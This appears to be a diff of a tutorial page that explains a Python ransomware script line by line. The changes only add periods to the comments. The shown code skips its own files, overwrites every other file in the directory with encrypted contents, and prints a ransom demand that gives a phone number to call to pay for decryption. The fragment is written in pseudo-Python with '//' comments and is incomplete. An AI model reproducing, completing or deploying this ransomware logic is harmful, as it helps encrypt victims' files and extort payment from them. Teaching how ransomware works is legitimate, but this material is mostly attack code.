@@ -52,9 +52,9 @@ files = [] // This will create an empty list called "files".
 
 for file in os.listdir() // This is a for loop, this will list all the files in the directory.
 
-if os.path.isfile(file) // If object is a file, add to the file list
+if os.path.isfile(file) // If object is a file, add to the file list.
 
-if file == "MALWARE.py" or file == "thekey.key" or file == "DECRYPT.py": // We are about to create a conditional statement to exclude these files from the list
+if file == "MALWARE.py" or file == "thekey.key" or file == "DECRYPT.py": // We are about to create a conditional statement to exclude these files from the list.
 
 continue // This tells the script to continue to the next statement and skip the current iteration, meaning the files in the if statement above will be excluded from the rest of the script. 
 
@@ -78,7 +78,7 @@ with open(file, "wb") as thefile: // Sets the script to write back to "thefile".
 
 thefile.write(contents_encrypted) // Writes the "contents_encrypted" to the file.
 
-print("All of your files have been encrypted. Contact 890-589-5542 to decrypt your data, for a price") // This is displayed in the terminal when the Python script is executed
+print("All of your files have been encrypted. Contact 890-589-5542 to decrypt your data, for a price") // This is displayed in the terminal when the Python script is executed.
 
 
 <h3>Decryption Sequence</h3> 
